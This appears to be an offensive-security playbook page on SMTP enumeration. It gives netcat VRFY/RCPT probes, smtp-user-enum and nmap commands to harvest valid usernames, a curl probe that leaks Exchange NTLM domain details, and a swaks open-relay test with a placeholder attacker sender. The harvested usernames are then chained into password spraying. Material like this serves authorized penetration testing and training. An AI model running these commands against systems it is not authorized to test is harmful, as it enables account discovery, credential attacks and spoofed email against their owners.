---
id: smtp-enum
title: SMTP Enumeration
stage: enumeration
tags: [windows, linux, smtp]
summary: Enumerate valid usernames via VRFY/RCPT commands and check for open relay misconfigurations.
leads_to:
  - password-spray
---

## Prerequisites

Port 25 (or 587, 465) open. No credentials required for user enumeration — it exploits response differences.

SMTP user enumeration exploits the fact that misconfigured mail servers return different responses for valid vs invalid recipients. This builds a username list without any credentials. On Exchange, the NTLM auth info disclosure leaks the domain name and internal hostname before you've made a single real login attempt.

## Quick Win

> Manual banner grab + VRFY to confirm user enum works before running tools.

```bash
nc -nnv $TARGET 25
VRFY root
VRFY admin
RCPT TO: <root@localhost>
```

## Automated User Enumeration

> Systematic username testing across a wordlist — feeds directly into password-spray.

```bash
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
```

```bash
nmap -Pn -p 25 --script smtp-enum-users,smtp-commands $TARGET
```

## NTLM Info Disclosure (Exchange)

> AUTH NTLM challenge on Exchange leaks domain name and server hostname — no valid creds needed.

```bash
curl -s "smtp://$TARGET" --user "a:a" --anyauth 2>&1 | grep -i "domain\|server"
# Or manually: connect and send "AUTH NTLM", base64-decode the server challenge
```

## Open Relay Test

> Misconfigured relay = send email as anyone — document as a finding, low direct exploit value.

```bash
swaks --to victim@example.com --from attacker@attacker.com --server $TARGET
```

## Leads To

Valid username list → password-spray using those usernames across SSH, SMB, WinRM, and web login forms. NTLM info disclosure reveals domain name → use for Kerberos enumeration and LDAP queries. Open relay is primarily a documentation finding unless used for phishing in a full red team engagement.
